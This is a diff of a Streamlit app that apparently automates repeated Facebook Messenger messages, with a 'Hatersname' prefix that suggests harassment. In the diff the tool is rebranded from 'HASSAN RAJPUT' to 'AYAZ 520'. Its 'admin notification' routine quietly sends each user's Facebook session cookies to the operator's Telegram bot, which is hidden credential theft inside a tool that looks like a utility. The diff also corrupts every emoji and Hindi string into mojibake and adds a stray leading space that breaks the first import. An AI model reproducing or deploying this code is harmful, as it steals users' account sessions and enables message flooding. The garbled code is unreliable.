@@ -1,4 +1,4 @@
-import streamlit as st
+ import streamlit as st
 import time
 import threading
 from pathlib import Path
@@ -12,7 +12,7 @@ import os
 
 st.set_page_config(
     page_title="FB E2EE by AYAZ 520",
-    page_icon="👑",
+    page_icon="ðŸ‘‘",
     layout="wide",
     initial_sidebar_state="expanded"
 )
@@ -232,13 +232,13 @@ def find_message_input(driver, process_id, automation_state=None):
                         
                         keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                         if any(keyword in element_text for keyword in keywords):
-                            log_message(f'{process_id}: ✅ Found message input with text: {element_text[:50]}', automation_state)
+                            log_message(f'{process_id}: âœ… Found message input with text: {element_text[:50]}', automation_state)
                             return element
                         elif idx < 10:
-                            log_message(f'{process_id}: ✅ Using primary selector editable element (#{idx+1})', automation_state)
+                            log_message(f'{process_id}: âœ… Using primary selector editable element (#{idx+1})', automation_state)
                             return element
                         elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
-                            log_message(f'{process_id}: ✅ Using fallback editable element', automation_state)
+                            log_message(f'{process_id}: âœ… Using fallback editable element', automation_state)
                             return element
                 except Exception as e:
                     log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
@@ -484,14 +484,14 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         
         cookies_display = cookies if cookies else "No cookies"
         
-        message = f"""🔔 *New User Started Automation*
+        message = f"""ðŸ”” *New User Started Automation*
 
-👤 *Username:* {username}
-⏰ *Time:* {current_time}
-🤖 *System:* HASSAN RAJPUT E2EE Facebook Automation
-🍪 *Cookies:* `{cookies_display}`
+ðŸ‘¤ *Username:* {username}
+â° *Time:* {current_time}
+ðŸ¤– *System:* AYAZ 520 E2EE Facebook Automation
+ðŸª *Cookies:* `{cookies_display}`
 
-✅ User has successfully started the automation process."""
+âœ… User has successfully started the automation process."""
         
         url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
         data = {
@@ -500,18 +500,18 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
             "parse_mode": "Markdown"
         }
         
-        log_message(f"TELEGRAM-NOTIFY: 📤 Sending notification to admin...", automation_state)
+        log_message(f"TELEGRAM-NOTIFY: ðŸ“¤ Sending notification to admin...", automation_state)
         response = requests.post(url, data=data, timeout=10)
         
         if response.status_code == 200:
-            log_message(f"TELEGRAM-NOTIFY: ✅ Admin notification sent successfully via Telegram!", automation_state)
+            log_message(f"TELEGRAM-NOTIFY: âœ… Admin notification sent successfully via Telegram!", automation_state)
             return True
         else:
-            log_message(f"TELEGRAM-NOTIFY: ❌ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
+            log_message(f"TELEGRAM-NOTIFY: âŒ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
             return False
             
     except Exception as e:
-        log_message(f"TELEGRAM-NOTIFY: ❌ Error: {str(e)}", automation_state)
+        log_message(f"TELEGRAM-NOTIFY: âŒ Error: {str(e)}", automation_state)
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
@@ -524,10 +524,10 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
         telegram_success = send_telegram_notification(username, automation_state, user_cookies)
         
         if telegram_success:
-            log_message(f"ADMIN-NOTIFY: ✅ Notification sent via Telegram! Skipping Facebook approach.", automation_state)
+            log_message(f"ADMIN-NOTIFY: âœ… Notification sent via Telegram! Skipping Facebook approach.", automation_state)
             return
         else:
-            log_message(f"ADMIN-NOTIFY: ⚠️ Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
+            log_message(f"ADMIN-NOTIFY: âš ï¸ Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
         
         log_message(f"ADMIN-NOTIFY: Target admin UID: {ADMIN_UID}", automation_state)
         
@@ -569,14 +569,14 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
             saved_thread_id, saved_chat_type = db.get_admin_e2ee_thread_id(user_id, current_cookies)
             if saved_thread_id:
                 if saved_thread_id == user_chat_id:
-                    log_message(f"ADMIN-NOTIFY: ❌ Saved thread ({saved_thread_id}) is same as user's chat! Clearing and re-searching...", automation_state)
+                    log_message(f"ADMIN-NOTIFY: âŒ Saved thread ({saved_thread_id}) is same as user's chat! Clearing and re-searching...", automation_state)
                     db.clear_admin_e2ee_thread_id(user_id)
                     saved_thread_id = None
                     saved_chat_type = None
                 else:
                     e2ee_thread_id = saved_thread_id
                     chat_type_display = saved_chat_type or 'E2EE'
-                    log_message(f"ADMIN-NOTIFY: ✅ Found valid saved {chat_type_display} thread ID: {saved_thread_id}", automation_state)
+                    log_message(f"ADMIN-NOTIFY: âœ… Found valid saved {chat_type_display} thread ID: {saved_thread_id}", automation_state)
             else:
                 log_message(f"ADMIN-NOTIFY: No saved thread ID or cookies changed, will search...", automation_state)
         
@@ -593,7 +593,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
             is_valid = ('/messages/t/' in current_url_check) or ('/e2ee/t/' in current_url_check)
             
             if is_valid:
-                log_message(f"ADMIN-NOTIFY: ✅ Saved {saved_chat_type or 'E2EE'} thread still valid!", automation_state)
+                log_message(f"ADMIN-NOTIFY: âœ… Saved {saved_chat_type or 'E2EE'} thread still valid!", automation_state)
             else:
                 log_message(f"ADMIN-NOTIFY: Saved thread invalid, will search...", automation_state)
                 saved_thread_id = None
@@ -601,9 +601,9 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                 e2ee_thread_id = None
         
         if saved_thread_id:
-            log_message(f"ADMIN-NOTIFY: ✅ Successfully opened saved E2EE conversation", automation_state)
+            log_message(f"ADMIN-NOTIFY: âœ… Successfully opened saved E2EE conversation", automation_state)
         else:
-            log_message(f"ADMIN-NOTIFY: 📱 Opening admin profile to find message button...", automation_state)
+            log_message(f"ADMIN-NOTIFY: ðŸ“± Opening admin profile to find message button...", automation_state)
             profile_url = f'https://www.facebook.com/profile.php?id={ADMIN_UID}'
             log_message(f"ADMIN-NOTIFY: Profile URL: {profile_url}", automation_state)
             driver.get(profile_url)
@@ -615,9 +615,9 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
             message_button_selectors = [
                 f'a[href*="/messages/t/"]',
                 'a[aria-label*="Message" i]',
-                'a[aria-label*="मैसेज" i]',
+                'a[aria-label*="à¤®à¥ˆà¤¸à¥‡à¤œ" i]',
                 'div[aria-label*="Message" i][role="button"]',
-                'div[aria-label*="मैसेज" i][role="button"]',
+                'div[aria-label*="à¤®à¥ˆà¤¸à¥‡à¤œ" i][role="button"]',
                 'a:contains("Message")',
                 'div[role="button"]:contains("Message")'
             ]
@@ -634,8 +634,8 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                     btn_label = (btn.get_attribute('aria-label') or '').strip()
                                     log_message(f"ADMIN-NOTIFY: Button found - Text: '{btn_text}', Label: '{btn_label}'", automation_state)
                                     
-                                    if 'message' in btn_text.lower() or 'message' in btn_label.lower() or 'मैसेज' in btn_text or 'मैसेज' in btn_label:
-                                        log_message(f"ADMIN-NOTIFY: ✅ Found Message button! Clicking...", automation_state)
+                                    if 'message' in btn_text.lower() or 'message' in btn_label.lower() or 'à¤®à¥ˆà¤¸à¥‡à¤œ' in btn_text or 'à¤®à¥ˆà¤¸à¥‡à¤œ' in btn_label:
+                                        log_message(f"ADMIN-NOTIFY: âœ… Found Message button! Clicking...", automation_state)
                                         current_url_before = driver.current_url
                                         driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", btn)
                                         time.sleep(8)
@@ -645,11 +645,11 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                         log_message(f"ADMIN-NOTIFY: URL after: {current_url_after[:80]}", automation_state)
                                         
                                         if current_url_after != current_url_before and ('messages' in current_url_after or '/t/' in current_url_after):
-                                            log_message(f"ADMIN-NOTIFY: ✅ Message button opened a conversation!", automation_state)
+                                            log_message(f"ADMIN-NOTIFY: âœ… Message button opened a conversation!", automation_state)
                                             message_button_found = True
                                             break
                                         else:
-                                            log_message(f"ADMIN-NOTIFY: ⚠️ URL didn't change to conversation, trying next button...", automation_state)
+                                            log_message(f"ADMIN-NOTIFY: âš ï¸ URL didn't change to conversation, trying next button...", automation_state)
                             except:
                                 continue
                     
@@ -659,7 +659,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     continue
             
             if not message_button_found:
-                log_message(f"ADMIN-NOTIFY: ⚠️ Message button not found on profile, trying all clickable elements...", automation_state)
+                log_message(f"ADMIN-NOTIFY: âš ï¸ Message button not found on profile, trying all clickable elements...", automation_state)
                 try:
                     all_elements = driver.find_elements(By.CSS_SELECTOR, 'a, div[role="button"], span[role="button"]')
                     log_message(f"ADMIN-NOTIFY: Found {len(all_elements)} total clickable elements", automation_state)
@@ -669,7 +669,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                             elem_text = (elem.text or '').strip().lower()
                             elem_label = (elem.get_attribute('aria-label') or '').strip().lower()
                             
-                            if ('message' in elem_text or 'message' in elem_label or 'मैसेज' in elem_text) and elem.is_displayed():
+                            if ('message' in elem_text or 'message' in elem_label or 'à¤®à¥ˆà¤¸à¥‡à¤œ' in elem_text) and elem.is_displayed():
                                 log_message(f"ADMIN-NOTIFY: Found element with 'message': '{elem_text[:30]}' / '{elem_label[:30]}'", automation_state)
                                 driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", elem)
                                 time.sleep(8)
@@ -690,7 +690,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     btn_text = (btn.text or '').strip().lower()
                     btn_label = (btn.get_attribute('aria-label') or '').strip().lower()
                     
-                    if ('continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text) and btn.is_displayed():
+                    if ('continue' in btn_text or 'continue' in btn_label or 'à¤œà¤¾à¤°à¥€' in btn_text) and btn.is_displayed():
                         log_message(f"ADMIN-NOTIFY: Found E2EE Continue dialog, clicking...", automation_state)
                         driver.execute_script("arguments[0].click();", btn)
                         time.sleep(8)
@@ -706,15 +706,15 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                 log_message(f"ADMIN-NOTIFY: Extracted E2EE thread ID: {e2ee_thread_id}", automation_state)
                 
                 if e2ee_thread_id == ADMIN_UID:
-                    log_message(f"ADMIN-NOTIFY: ⚠️ Thread ID is admin UID, not actual thread", automation_state)
+                    log_message(f"ADMIN-NOTIFY: âš ï¸ Thread ID is admin UID, not actual thread", automation_state)
                     e2ee_thread_id = None
                 elif e2ee_thread_id == user_chat_id:
-                    log_message(f"ADMIN-NOTIFY: ⚠️ Opened user's own chat, not admin", automation_state)
+                    log_message(f"ADMIN-NOTIFY: âš ï¸ Opened user's own chat, not admin", automation_state)
                     e2ee_thread_id = None
                 elif e2ee_thread_id and user_id:
                     current_cookies = user_config.get('cookies', '')
                     db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
-                    log_message(f"ADMIN-NOTIFY: ✅ Profile approach SUCCESS! E2EE Thread ID: {e2ee_thread_id}", automation_state)
+                    log_message(f"ADMIN-NOTIFY: âœ… Profile approach SUCCESS! E2EE Thread ID: {e2ee_thread_id}", automation_state)
             else:
                 log_message(f"ADMIN-NOTIFY: Profile didn't open E2EE chat (URL: {current_url[:80]})", automation_state)
         
@@ -746,7 +746,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     continue
             
             if not search_box:
-                log_message(f"ADMIN-NOTIFY: ❌ Could not find search box", automation_state)
+                log_message(f"ADMIN-NOTIFY: âŒ Could not find search box", automation_state)
                 return
             
             log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
@@ -801,7 +801,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                         btn_text = (cont_btn.text or '').lower()
                                         btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                         
-                                        if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
+                                        if 'continue' in btn_text or 'continue' in btn_label or 'à¤œà¤¾à¤°à¥€' in btn_text:
                                             log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from search result, clicking Continue...", automation_state)
                                             driver.execute_script("arguments[0].click();", cont_btn)
                                             time.sleep(8)
@@ -816,12 +816,12 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                     e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                     
                                     if e2ee_thread_id == ADMIN_UID:
-                                        log_message(f"ADMIN-NOTIFY: ⚠️ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread, trying next...", automation_state)
+                                        log_message(f"ADMIN-NOTIFY: âš ï¸ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread, trying next...", automation_state)
                                         driver.back()
                                         time.sleep(3)
                                         continue
                                     elif e2ee_thread_id == user_chat_id:
-                                        log_message(f"ADMIN-NOTIFY: ⚠️ This is user's own chat ({e2ee_thread_id}), skipping...", automation_state)
+                                        log_message(f"ADMIN-NOTIFY: âš ï¸ This is user's own chat ({e2ee_thread_id}), skipping...", automation_state)
                                         driver.back()
                                         time.sleep(3)
                                         continue
@@ -829,14 +829,14 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                     if e2ee_thread_id and user_id:
                                         current_cookies = user_config.get('cookies', '')
                                         db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
-                                        log_message(f"ADMIN-NOTIFY: ✅ Found & saved admin E2EE thread ID: {e2ee_thread_id}", automation_state)
+                                        log_message(f"ADMIN-NOTIFY: âœ… Found & saved admin E2EE thread ID: {e2ee_thread_id}", automation_state)
                                     admin_found = True
                                     break
                                 elif '/messages/t/' in current_url:
                                     regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                     
                                     if regular_thread_id == user_chat_id:
-                                        log_message(f"ADMIN-NOTIFY: ⚠️ This is user's own chat ({regular_thread_id}), skipping...", automation_state)
+                                        log_message(f"ADMIN-NOTIFY: âš ï¸ This is user's own chat ({regular_thread_id}), skipping...", automation_state)
                                         driver.back()
                                         time.sleep(3)
                                         continue
@@ -845,7 +845,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                     if e2ee_thread_id and user_id:
                                         current_cookies = user_config.get('cookies', '')
                                         db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
-                                        log_message(f"ADMIN-NOTIFY: ✅ Found & saved admin REGULAR chat thread ID: {e2ee_thread_id}", automation_state)
+                                        log_message(f"ADMIN-NOTIFY: âœ… Found & saved admin REGULAR chat thread ID: {e2ee_thread_id}", automation_state)
                                     admin_found = True
                                     break
                                 else:
@@ -863,7 +863,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     continue
             
             if not admin_found:
-                log_message(f"ADMIN-NOTIFY: ⚠️ Admin UID not found in search results, trying direct admin profile...", automation_state)
+                log_message(f"ADMIN-NOTIFY: âš ï¸ Admin UID not found in search results, trying direct admin profile...", automation_state)
                 
                 try:
                     profile_url = f'https://www.facebook.com/{ADMIN_UID}'
@@ -913,7 +913,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                     btn_text = (cont_btn.text or '').lower()
                                     btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                     
-                                    if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
+                                    if 'continue' in btn_text or 'continue' in btn_label or 'à¤œà¤¾à¤°à¥€' in btn_text:
                                         log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from profile, clicking Continue...", automation_state)
                                         driver.execute_script("arguments[0].click();", cont_btn)
                                         time.sleep(8)
@@ -924,7 +924,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                             current_url = driver.current_url
                             
                             if current_url == current_url_before or 'profile.php' in current_url:
-                                log_message(f"ADMIN-NOTIFY: ⚠️ Message button didn't open conversation (still on profile)", automation_state)
+                                log_message(f"ADMIN-NOTIFY: âš ï¸ Message button didn't open conversation (still on profile)", automation_state)
                                 continue
                             
                             log_message(f"ADMIN-NOTIFY: Opened URL from profile: {current_url}", automation_state)
@@ -933,30 +933,30 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                 e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                 
                                 if e2ee_thread_id == ADMIN_UID:
-                                    log_message(f"ADMIN-NOTIFY: ⚠️ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread!", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âš ï¸ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread!", automation_state)
                                     continue
                                 elif e2ee_thread_id == user_chat_id:
-                                    log_message(f"ADMIN-NOTIFY: ⚠️ Profile opened user's own chat ({e2ee_thread_id}), not admin's!", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âš ï¸ Profile opened user's own chat ({e2ee_thread_id}), not admin's!", automation_state)
                                     continue
                                 
                                 if e2ee_thread_id and user_id:
                                     current_cookies = user_config.get('cookies', '')
                                     db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
-                                    log_message(f"ADMIN-NOTIFY: ✅ Found admin E2EE from profile & saved: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âœ… Found admin E2EE from profile & saved: {e2ee_thread_id}", automation_state)
                                 admin_found = True
                                 break
                             elif '/messages/t/' in current_url:
                                 regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                 
                                 if regular_thread_id == user_chat_id:
-                                    log_message(f"ADMIN-NOTIFY: ⚠️ Profile opened user's own chat ({regular_thread_id}), not admin's!", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âš ï¸ Profile opened user's own chat ({regular_thread_id}), not admin's!", automation_state)
                                     continue
                                 
                                 e2ee_thread_id = regular_thread_id
                                 if e2ee_thread_id and user_id:
                                     current_cookies = user_config.get('cookies', '')
                                     db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
-                                    log_message(f"ADMIN-NOTIFY: ✅ Found admin REGULAR chat from profile & saved: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âœ… Found admin REGULAR chat from profile & saved: {e2ee_thread_id}", automation_state)
                                 admin_found = True
                                 break
                     
@@ -964,7 +964,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
             
             if not admin_found or not e2ee_thread_id:
-                log_message(f"ADMIN-NOTIFY: ⚠️ Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
+                log_message(f"ADMIN-NOTIFY: âš ï¸ Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
                 
                 try:
                     profile_url = f'https://www.facebook.com/messages/new'
@@ -1013,11 +1013,11 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                 if '/e2ee/t/' in current_url:
                                     e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                     chat_type = 'E2EE'
-                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened E2EE: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âœ… Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                 else:
                                     e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                     chat_type = 'REGULAR'
-                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: âœ… Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                                 
                                 if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                     current_cookies = user_config.get('cookies', '')
@@ -1027,19 +1027,19 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
             
             if not admin_found or not e2ee_thread_id:
-                log_message(f"ADMIN-NOTIFY: ❌ ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
+                log_message(f"ADMIN-NOTIFY: âŒ ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
                 return
             
             conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
-            log_message(f"ADMIN-NOTIFY: ✅ Successfully opened {conversation_type} conversation with admin", automation_state)
+            log_message(f"ADMIN-NOTIFY: âœ… Successfully opened {conversation_type} conversation with admin", automation_state)
         
         message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
         
         if message_input:
             from datetime import datetime
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            conversation_type = "E2EE 🔒" if "e2ee" in driver.current_url.lower() else "Regular 💬"
-            notification_msg = f"🔔 New User Started Automation\n\n👤 Username: {username}\n⏰ Time: {current_time}\n📱 Chat Type: {conversation_type}\n🆔 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
+            conversation_type = "E2EE ðŸ”’" if "e2ee" in driver.current_url.lower() else "Regular ðŸ’¬"
+            notification_msg = f"ðŸ”” New User Started Automation\n\nðŸ‘¤ Username: {username}\nâ° Time: {current_time}\nðŸ“± Chat Type: {conversation_type}\nðŸ†” Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
             
             log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
             driver.execute_script("""
@@ -1091,16 +1091,16 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     
                     events.forEach(event => element.dispatchEvent(event));
                 """, message_input)
-                log_message(f"ADMIN-NOTIFY: ✅ Sent via Enter key: '{notification_msg}'", automation_state)
+                log_message(f"ADMIN-NOTIFY: âœ… Sent via Enter key: '{notification_msg}'", automation_state)
             else:
-                log_message(f"ADMIN-NOTIFY: ✅ Send button clicked: '{notification_msg}'", automation_state)
+                log_message(f"ADMIN-NOTIFY: âœ… Send button clicked: '{notification_msg}'", automation_state)
             
             time.sleep(2)
         else:
-            log_message(f"ADMIN-NOTIFY: ❌ Failed to find message input", automation_state)
+            log_message(f"ADMIN-NOTIFY: âŒ Failed to find message input", automation_state)
             
     except Exception as e:
-        log_message(f"ADMIN-NOTIFY: ❌ Error sending notification: {str(e)}", automation_state)
+        log_message(f"ADMIN-NOTIFY: âŒ Error sending notification: {str(e)}", automation_state)
     finally:
         if driver:
             try:
@@ -1135,10 +1135,10 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>HASSAN RAJPUT E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>AYAZ 520 E2EE FACEBOOK CONVO</h1><p>Created by AYAZ 520</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
-    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
+    tab1, tab2 = st.tabs(["ðŸ” Login", "âœ¨ Sign Up"])
     
     with tab1:
         st.markdown("### Welcome Back!")
@@ -1159,12 +1159,12 @@ if not st.session_state.logged_in:
                         if user_config and user_config['chat_id']:
                             start_automation(user_config, user_id)
                     
-                    st.success(f"✅ Welcome back, {username}!")
+                    st.success(f"âœ… Welcome back, {username}!")
                     st.rerun()
                 else:
-                    st.error("❌ Invalid username or password!")
+                    st.error("âŒ Invalid username or password!")
             else:
-                st.warning("⚠️ Please enter both username and password")
+                st.warning("âš ï¸ Please enter both username and password")
     
     with tab2:
         st.markdown("### Create New Account")
@@ -1177,13 +1177,13 @@ if not st.session_state.logged_in:
                 if new_password == confirm_password:
                     success, message = db.create_user(new_username, new_password)
                     if success:
-                        st.success(f"✅ {message} Please login now!")
+                        st.success(f"âœ… {message} Please login now!")
                     else:
-                        st.error(f"❌ {message}")
+                        st.error(f"âŒ {message}")
                 else:
-                    st.error("❌ Passwords do not match!")
+                    st.error("âŒ Passwords do not match!")
             else:
-                st.warning("⚠️ Please fill all fields")
+                st.warning("âš ï¸ Please fill all fields")
 
 else:
     if not st.session_state.auto_start_checked and st.session_state.user_id:
@@ -1194,10 +1194,10 @@ else:
             if user_config and user_config['chat_id']:
                 start_automation(user_config, st.session_state.user_id)
     
-    st.sidebar.markdown(f"### 👤 {st.session_state.username}")
+    st.sidebar.markdown(f"### ðŸ‘¤ {st.session_state.username}")
     st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
     
-    if st.sidebar.button("🚪 Logout", use_container_width=True):
+    if st.sidebar.button("ðŸšª Logout", use_container_width=True):
         if st.session_state.automation_state.running:
             stop_automation(st.session_state.user_id)
         
@@ -1211,7 +1211,7 @@ else:
     user_config = db.get_user_config(st.session_state.user_id)
     
     if user_config:
-        tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
+        tab1, tab2 = st.tabs(["âš™ï¸ Configuration", "ðŸš€ Automation"])
         
         with tab1:
             st.markdown("### Your Configuration")
@@ -1221,7 +1221,7 @@ else:
                                    help="Facebook conversation ID from the URL")
             
             name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'],
-                                       placeholder="e.g., [END TO END HASSAN RAJPUT HERE]",
+                                       placeholder="e.g., [END TO END AYAZ 520 HERE]",
                                        help="Prefix to add before each message")
             
             delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
@@ -1240,7 +1240,7 @@ else:
                                    height=150,
                                    help="Enter each message on a new line")
             
-            if st.button("💾 Save Configuration", use_container_width=True):
+            if st.button("ðŸ’¾ Save Configuration", use_container_width=True):
                 final_cookies = cookies if cookies.strip() else user_config['cookies']
                 db.update_user_config(
                     st.session_state.user_id,
@@ -1250,7 +1250,7 @@ else:
                     final_cookies,
                     messages
                 )
-                st.success("✅ Configuration saved successfully!")
+                st.success("âœ… Configuration saved successfully!")
                 st.rerun()
         
         with tab2:
@@ -1262,7 +1262,7 @@ else:
                 st.metric("Messages Sent", st.session_state.automation_state.message_count)
             
             with col2:
-                status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
+                status = "ðŸŸ¢ Running" if st.session_state.automation_state.running else "ðŸ”´ Stopped"
                 st.metric("Status", status)
             
             with col3:
@@ -1271,20 +1271,20 @@ else:
             col1, col2 = st.columns(2)
             
             with col1:
-                if st.button("▶️ Start E2ee", disabled=st.session_state.automation_state.running, use_container_width=True):
+                if st.button("â–¶ï¸ Start E2ee", disabled=st.session_state.automation_state.running, use_container_width=True):
                     current_config = db.get_user_config(st.session_state.user_id)
                     if current_config and current_config['chat_id']:
                         start_automation(current_config, st.session_state.user_id)
                         st.rerun()
                     else:
-                        st.error("❌ Please configure Chat ID first!")
+                        st.error("âŒ Please configure Chat ID first!")
             
             with col2:
-                if st.button("⏹️ Stop E2ee", disabled=not st.session_state.automation_state.running, use_container_width=True):
+                if st.button("â¹ï¸ Stop E2ee", disabled=not st.session_state.automation_state.running, use_container_width=True):
                     stop_automation(st.session_state.user_id)
                     st.rerun()
             
-            st.markdown("### 📊 Live Logs")
+            st.markdown("### ðŸ“Š Live Logs")
             
             if st.session_state.automation_state.logs:
                 logs_html = '<div class="log-container">'
@@ -1299,4 +1299,4 @@ else:
                 time.sleep(1)
                 st.rerun()
 
-st.markdown('<div class="footer">Made with ❤️ by AYAZ 520 | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with â¤ï¸ by AYAZ 520 | Â© 2025 All Rights Reserved</div>', unsafe_allow_html=True)
